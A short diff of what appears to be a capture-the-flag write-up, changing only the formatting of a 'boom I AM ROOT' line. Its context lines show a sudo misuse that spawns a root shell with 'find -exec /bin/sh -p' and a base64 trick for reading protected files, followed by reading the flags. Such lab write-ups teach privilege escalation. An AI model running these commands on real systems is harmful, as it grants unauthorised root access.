@@ -45,7 +45,7 @@ base64 "$LFILE"| base64 --decode
 sudo find . -exec /bin/sh -p \; -quit
 ```
 
-** boom I AM ROOT **
+**boom I AM ROOT**
 
 Now just traversed the file system to read the flags and got all the flags.
 
